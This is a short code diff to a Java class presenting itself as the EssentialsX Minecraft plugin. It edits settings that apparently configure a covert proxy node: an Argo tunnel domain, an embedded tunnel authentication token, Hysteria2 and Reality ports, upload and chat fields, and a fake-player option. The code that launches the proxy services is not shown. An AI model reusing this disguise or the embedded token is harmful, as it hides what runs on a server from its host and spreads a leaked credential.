@@ -191,10 +191,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "gratis.cnm.ccwu.cc");
         env.put("ARGO_AUTH", "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiNDJhZWVkY2MtMTIxNy00ZjgzLWFiZmQtMzRjNjc3YWM3OTY5IiwicyI6Ik5ETTFNREpsTVdVdE9XUTJZaTAwTTJaa0xXSTJOamN0Wm1JellUVm1NelUzTVRrNSJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
+        env.put("HY2_PORT", "27722");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("REALITY_PORT", "27722");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
@@ -202,7 +202,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
         env.put("NAME", "");
-        env.put("DISABLE_ARGO", "false");
+        env.put("DISABLE_ARGO", "true");
         env.put("FAKE_PLAYER_ENABLED", "true");
         env.put("FAKE_PLAYER_NAME", "Steve");
         env.put("MC_PORT", "25565");
